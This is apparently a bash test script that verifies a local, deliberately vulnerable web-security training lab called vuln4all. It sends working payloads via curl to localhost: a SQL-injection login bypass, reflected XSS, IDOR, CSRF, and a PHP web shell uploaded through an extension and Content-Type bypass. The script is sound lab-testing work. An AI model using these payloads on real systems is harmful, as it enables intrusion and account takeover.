#!/usr/bin/env bash
# vuln4all 端到端验证：起靶场 → 用 curl 把每道题真打一遍 → 收尾。
#
# 只在隔离环境（本地虚拟机 / 专用测试机）里跑。这个脚本会真的把每道题的
# 漏洞打通一遍，并且会在最后把 workspace/ 全部重置。
#
#   bash tools/verify.sh
#   PORT=9000 bash tools/verify.sh

set -u

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$ROOT" || exit 1

PORT="${PORT:-8800}"
BASE="http://127.0.0.1:${PORT}"
PIDFILE="/tmp/v4a-verify.pid"
LOG="/tmp/v4a-verify.log"
JAR="/tmp/v4a-verify.cookies"
rm -f "$JAR"

PASS=0
FAIL=0

ok()   { PASS=$((PASS + 1)); printf '  \033[32mPASS\033[0m  %s\n' "$1"; }
bad()  { FAIL=$((FAIL + 1)); printf '  \033[31mFAIL\033[0m  %s\n' "$1"; }
step() { printf '\n\033[1m%s\033[0m\n' "$1"; }

has() { case "$2" in *"$1"*) return 0 ;; *) return 1 ;; esac; }

expect_has()  { if has "$2" "$3"; then ok "$1"; else bad "$1（返回体里找不到 [$2]）"; fi; }
expect_no()   { if has "$2" "$3"; then bad "$1（不该出现 [$2]，却出现了）"; else ok "$1"; fi; }
expect_code() { if [ "$2" = "$3" ]; then ok "$1"; else bad "$1（期望 HTTP $3，实际 $2）"; fi; }

cleanup() {
  if [ -f "$PIDFILE" ]; then
    pid=$(cat "$PIDFILE")
    # 杀之前核对命令行，只杀本脚本自己起的那个进程
    if [ -r "/proc/$pid/cmdline" ] && tr '\0' ' ' <"/proc/$pid/cmdline" | grep -q "vuln4all"; then
      kill "$pid" 2>/dev/null
      sleep 1
      kill -9 "$pid" 2>/dev/null
      echo "  已停掉靶场进程 $pid"
    else
      echo "  PID $pid 的命令行对不上，没动它"
    fi
    rm -f "$PIDFILE"
  fi
}
trap cleanup EXIT

step "0. 起靶场"
if [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
  echo "  端口上已经有本脚本起的进程，先停掉"
  cleanup
fi
nohup python3 -m vuln4all run --port "$PORT" >"$LOG" 2>&1 &
echo $! >"$PIDFILE"
for _ in $(seq 1 40); do
  curl -s -o /dev/null "$BASE/" && break
  sleep 0.25
done
if curl -s -o /dev/null "$BASE/"; then
  ok "靶场起来了（pid $(cat "$PIDFILE")，日志 $LOG）"
else
  bad "靶场起不来，看 $LOG"
  tail -30 "$LOG"
  exit 1
fi

step "1. 清单页与体检页"
body=$(curl -s "$BASE/")
expect_has "清单页列出 sqli"   "登录处的 SQL 注入" "$body"
expect_has "清单页列出 csrf"   "改密码处的 CSRF" "$body"
expect_has "清单页列出 xss"    "搜索框的反射型 XSS" "$body"
expect_has "清单页列出 idor"   "改个数字看别人的订单" "$body"
expect_has "清单页列出 upload" "上传头像处的文件类型绕过" "$body"
expect_has "清单页露出攻击者站点入口" "/evil-site/" "$body"

code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/__vuln4all/status")
expect_code "体检页可访问" "$code" "200"

step "2. SQLi —— 登录绕过"
body=$(curl -s -X POST "$BASE/v/sqli/login_bypass/" \
  --data-urlencode "username=admin" --data-urlencode "password=wrong")
expect_has "密码确实错时会报错" "用户名或密码错误" "$body"

code=$(curl -s -o /dev/null -w '%{http_code}' -c "$JAR" -X POST "$BASE/v/sqli/login_bypass/" \
  --data-urlencode "username=admin' --" --data-urlencode "password=whatever")
expect_code "admin' --  被接受（302）" "$code" "302"

body=$(curl -s -b "$JAR" "$BASE/v/sqli/login_bypass/welcome")
expect_has "拿到 admin 身份，判定通关" "这题通了" "$body"
rm -f "$JAR"

body=$(curl -s -X POST "$BASE/v/sqli/login_bypass/" \
  --data-urlencode "username='" --data-urlencode "password=x")
expect_has "单个单引号触发报错回显" "数据库报错" "$body"

step "3. XSS —— 反射"
body=$(curl -s "$BASE/v/xss/reflect_search/?q=%3Cb%3Ehello%3C%2Fb%3E")
expect_has "无害标签被当成标签解析" "<b>hello</b>" "$body"

body=$(curl -s --get "$BASE/v/xss/reflect_search/" \
  --data-urlencode 'q=<script>alert(document.cookie)</script>')
expect_has "script 标签原样出现在 HTML 里" "<script>alert(document.cookie)</script>" "$body"

body=$(curl -s --get "$BASE/v/xss/reflect_search/" \
  --data-urlencode 'q=<img src=x onerror=alert(1)>')
expect_has "img onerror 载荷原样出现" "onerror=alert(1)" "$body"

step "4. IDOR —— 换个订单号"
curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/idor/order_detail/login" \
  --data-urlencode "username=alice" --data-urlencode "password=alice123"
body=$(curl -s -b "$JAR" "$BASE/v/idor/order_detail/orders")
expect_has "alice 看得到自己的订单" "机械键盘" "$body"
expect_no "alice 的列表里没有 bob 的订单" "礼品卡" "$body"

body=$(curl -s -b "$JAR" "$BASE/v/idor/order_detail/order/1001")
expect_has "看自己的订单是正常的" "这是你自己的订单" "$body"

body=$(curl -s -b "$JAR" "$BASE/v/idor/order_detail/order/1003")
expect_has "改个数字就看到 bob 的订单" "别人的订单" "$body"
expect_has "越权页判定通关" "这题通了" "$body"
expect_has "泄露了 bob 的私密备注" "别外传" "$body"
rm -f "$JAR"

step "5. CSRF —— 带着受害者的 cookie 改密码"
curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/csrf/password_change/login" \
  --data-urlencode "username=bob" --data-urlencode "password=password123"
body=$(curl -s -b "$JAR" "$BASE/v/csrf/password_change/profile")
expect_has "bob 登录成功进到个人中心" "员工个人中心" "$body"
expect_no "改密码表单里没有 CSRF token" 'name="csrf"' "$body"

body=$(curl -s "$BASE/evil-site/")
expect_has "攻击者站点可达" "恭喜你中奖" "$body"
expect_has "攻击者站点指向受害者站的接口" "/v/csrf/password_change/change-password" "$body"

# 关键一步：带着 bob 的 session cookie，但从「攻击者」那边发起
code=$(curl -s -o /dev/null -w '%{http_code}' -b "$JAR" -X POST \
  "$BASE/v/csrf/password_change/change-password" \
  --data-urlencode "new_password=pwned-by-csrf")
expect_code "改密码请求被接受（服务端不看来源）" "$code" "302"
rm -f "$JAR"

code=$(curl -s -o /dev/null -w '%{http_code}' -c "$JAR" -X POST \
  "$BASE/v/csrf/password_change/login" \
  --data-urlencode "username=bob" --data-urlencode "password=password123")
expect_code "旧密码已经不好使了" "$code" "200"
rm -f "$JAR"

code=$(curl -s -o /dev/null -w '%{http_code}' -c "$JAR" -X POST \
  "$BASE/v/csrf/password_change/login" \
  --data-urlencode "username=bob" --data-urlencode "password=pwned-by-csrf")
expect_code "被 CSRF 改掉的新密码能登进去" "$code" "302"
rm -f "$JAR"

step "6. 上传 —— 后缀与 Content-Type 绕过"
printf '<?php system($_GET[0]); ?>' >/tmp/v4a-shell.php

code=$(curl -s -o /tmp/v4a-up1.html -w '%{http_code}' -X POST \
  -F 'avatar=@/tmp/v4a-shell.php;filename=shell.php;type=image/png' \
  "$BASE/v/upload/avatar/upload")
expect_code "原样 .php 被黑名单拦下（400）" "$code" "400"

code=$(curl -s -o /tmp/v4a-up2.html -w '%{http_code}' -X POST \
  -F 'avatar=@/tmp/v4a-shell.php;filename=shell.PHp;type=application/octet-stream' \
  "$BASE/v/upload/avatar/upload")
expect_code "只改大小写，被 Content-Type 拦下（400）" "$code" "400"
expect_has "被拦时页面回显了客户端声明的 Content-Type" "application/octet-stream" "$(cat /tmp/v4a-up2.html)"

code=$(curl -s -o /tmp/v4a-up3.html -w '%{http_code}' -X POST \
  -F 'avatar=@/tmp/v4a-shell.php;filename=shell.PHp;type=image/png' \
  "$BASE/v/upload/avatar/upload")
expect_code "两处一起绕过 —— 上传成功（200）" "$code" "200"
body=$(cat /tmp/v4a-up3.html)
expect_has "页面判定绕过成功" "绕过去了" "$body"
expect_has "页面点明通关" "这题通了" "$body"

body=$(curl -s "$BASE/v/upload/avatar/uploads/shell.PHp")
expect_has "落地的文件能被直接访问到" '<?php system' "$body"

step "7. reset —— 恢复出厂"
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=csrf/password_change")
expect_code "页面上的重置按钮生效（303）" "$code" "303"

rm -f "$JAR"
code=$(curl -s -o /dev/null -w '%{http_code}' -c "$JAR" -X POST \
  "$BASE/v/csrf/password_change/login" \
  --data-urlencode "username=bob" --data-urlencode "password=password123")
expect_code "重置后 bob 的密码复原了" "$code" "302"
rm -f "$JAR"

curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/idor/order_detail/login" \
  --data-urlencode "username=alice" --data-urlencode "password=alice123"
body=$(curl -s -b "$JAR" "$BASE/v/idor/order_detail/orders")
expect_has "只重置了一题，别的题的数据没被动" "机械键盘" "$body"
rm -f "$JAR"

code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=*")
expect_code "重置全部（303）" "$code" "303"

body=$(curl -s "$BASE/v/upload/avatar/")
expect_no "重置全部后上传的文件被清掉了" "shell.PHp" "$body"

# 浏览器发起的跨站重置应该被拒（curl 不带 Origin，所以上面那些不受影响）
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/__vuln4all/reset" \
  -H "Origin: http://evil.example" --data-urlencode "id=*")
expect_code "跨站来的重置请求被拒（403）" "$code" "403"

# 开放重定向：反斜杠变体
loc=$(curl -s -o /dev/null -w '%{redirect_url}' -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=sqli/login_bypass" --data-urlencode 'next=/\evil.example')
case "$loc" in
  *evil.example*) bad "next=/\evil.example 被放行了（开放重定向）：$loc" ;;
  *)              ok  "反斜杠变体的 next 被吃掉了" ;;
esac

rm -f /tmp/v4a-shell.php /tmp/v4a-up1.html /tmp/v4a-up2.html /tmp/v4a-up3.html "$JAR"

step "8. 命令行"
out=$(python3 -m vuln4all list)
expect_has "list 认得所有分类" "[upload]" "$out"

out=$(python3 -m vuln4all doctor 2>&1)
ec=$?
expect_no "doctor 不再把 templates/ 误报成缺 module.py" "templates 这个目录下" "$out"
expect_no "doctor 不再提 __pycache__" "__pycache__" "$out"
if [ "$ec" = "0" ]; then ok "doctor 退出码是 0"; else bad "doctor 退出码是 $ec"; fi

step "9. core 契约加固（在 /tmp 的副本里做，不动真靶场）"
LAB=/tmp/v4a-hardening
rm -rf "$LAB"
mkdir -p "$LAB"
cp -r "$ROOT/vuln4all" "$ROOT/modules" "$LAB/"

cd "$LAB" || exit 1

# ---- 9a 归一化撞名：id 里的 - 和 _ 必须能共存（sqli/login_bypass 已存在）
mkdir -p "modules/sqli/login-bypass"
cat >"modules/sqli/login-bypass/module.py" <<'PY'
"""对照组：这个 id 用连字符，必须和 modules/sqli/login_bypass 各自独立。"""
from vuln4all import Vuln


class DashVariant(Vuln):
    info = {
        "name": "连字符对照组",
        "author": ["x"],
        "cwe": "CWE-0",
        "owasp": "-",
        "description": "用来验证归一化撞名已经修掉。",
        "hint": "-",
        "solution": "-",
    }

    def create_app(self, ctx):
        app = ctx.flask(__name__)

        @app.route("/")
        def index():
            return "dash-variant"

        return {"": app}
PY

# ---- 9b 抢占 core 的保留前缀
mkdir -p "modules/zztest/reserved_path"
cat >"modules/zztest/reserved_path/module.py" <<'PY'
"""这个模块想把 core 的体检页抢过来，应该被摘掉。"""
from vuln4all import Vuln


class StealStatus(Vuln):
    info = {
        "name": "抢体检页",
        "author": ["x"],
        "cwe": "CWE-0",
        "owasp": "-",
        "description": "应该被拒绝。",
        "hint": "-",
        "solution": "-",
        "mounts": {"evil": {"path": "/__vuln4all/status"}},
    }

    def create_app(self, ctx):
        main = ctx.flask(__name__)
        evil = ctx.flask(__name__, mount="evil")

        @main.route("/")
        def index():
            return "main"

        @evil.route("/")
        def hijack():
            return "HijackedStatus"

        return {"": main, "evil": evil}
PY

# ---- 9c 抢占已经被别的模块占了的挂载点
mkdir -p "modules/zztest/steal_evil"
cat >"modules/zztest/steal_evil/module.py" <<'PY'
"""这个模块想挂到 /evil-site，但那个位置是 csrf/password_change 的。"""
from vuln4all import Vuln


class StealEvil(Vuln):
    info = {
        "name": "抢别人的挂载点",
        "author": ["x"],
        "cwe": "CWE-0",
        "owasp": "-",
        "description": "应该被拒绝。",
        "hint": "-",
        "solution": "-",
        "mounts": {"steal": {"path": "/evil-site"}},
    }

    def create_app(self, ctx):
        main = ctx.flask(__name__)
        steal = ctx.flask(__name__, mount="steal")

        @main.route("/")
        def index():
            return "main"

        @steal.route("/")
        def taken():
            return "StolenEvilSite"

        return {"": main, "steal": steal}
PY

# ---- 9d 多挂载点忘了传 mount=：两個 app 会用同一个 session cookie
mkdir -p "modules/zztest/forgot_mount"
cat >"modules/zztest/forgot_mount/module.py" <<'PY'
"""第二个 app 故意不传 mount=，doctor 应该抓出来。"""
from vuln4all import Vuln


class ForgotMount(Vuln):
    info = {
        "name": "忘了传 mount",
        "author": ["x"],
        "cwe": "CWE-0",
        "owasp": "-",
        "description": "应该被检查出来。",
        "hint": "-",
        "solution": "-",
    }

    def create_app(self, ctx):
        main = ctx.flask(__name__)
        second = ctx.flask(__name__)  # <- 忘了 mount="second"

        @main.route("/")
        def index():
            return "main"

        @second.route("/")
        def other():
            return "second"

        return {"": main, "second": second}
PY

# ---- 9e 主挂载点被抢：这时 entry.error 会被置上，doctor 必须还能说出是被谁抢的
mkdir -p "modules/zztest/main_conflict"
cat >"modules/zztest/main_conflict/module.py" <<'PY'
"""主挂载点被别人占了 —— 报错信息里必须说清是被谁占的。"""
from vuln4all import Vuln


class MainConflict(Vuln):
    info = {
        "name": "主挂载点被占",
        "author": ["x"],
        "cwe": "CWE-0",
        "owasp": "-",
        "description": "应该被判失败，而且要报出被谁占了。",
        "hint": "-",
        "solution": "-",
        "mounts": {"": {"path": "/evil-site"}},
    }

    def create_app(self, ctx):
        app = ctx.flask(__name__)

        @app.route("/")
        def index():
            return "main-conflict"

        return {"": app}
PY

out=$(python3 -m vuln4all doctor 2>&1)
expect_has "doctor 认出抢占 core 保留前缀" "撞上了 core 保留前缀" "$out"
expect_has "doctor 认出抢占别的模块的挂载点" "已经被 csrf/password_change 占了" "$out"
expect_has "doctor 认出忘了传 mount=" "mount=" "$out"
expect_has "主挂载点被抢时仍然报得出被谁抢的" "被摘掉了" "$out"

lst=$(python3 -m vuln4all list 2>&1)
expect_has "带连字符的 id 能共存" "sqli/login-bypass" "$lst"
expect_has "带下划线的 id 还在" "sqli/login_bypass" "$lst"

# 真起一次：归一化撞名会让后加载的顶掉先加载的，core 的体检页也会被抢走
nohup python3 -m vuln4all run --port 8803 >/tmp/v4a-lab.log 2>&1 &
LABPID=$!
for _ in $(seq 1 40); do
  curl -s -o /dev/null http://127.0.0.1:8803/ && break
  sleep 0.25
done
body=$(curl -s http://127.0.0.1:8803/__vuln4all/status)
expect_has "core 的体检页没被抢走" "体检" "$body"
expect_no "抢挂载点的模块没盖住 core" "HijackedStatus" "$body"

body=$(curl -s http://127.0.0.1:8803/v/sqli/login-bypass/)
expect_has "连字符那个模块自己跑起来了" "dash-variant" "$body"
body=$(curl -s http://127.0.0.1:8803/v/sqli/login_bypass/)
expect_has "下划线那个模块没被顶掉" "员工登录" "$body"

if [ -r "/proc/$LABPID/cmdline" ] && tr '\0' ' ' <"/proc/$LABPID/cmdline" | grep -q "vuln4all"; then
  kill "$LABPID" 2>/dev/null
  sleep 1
  kill -9 "$LABPID" 2>/dev/null
fi

cd "$ROOT" || exit 1
rm -rf "$LAB"

step "结果"
printf '  通过 %d 项，失败 %d 项\n' "$PASS" "$FAIL"
if [ "$FAIL" != "0" ]; then
  printf '\n靶场日志尾部：\n'
  tail -40 "$LOG"
  exit 1
fi
exit 0
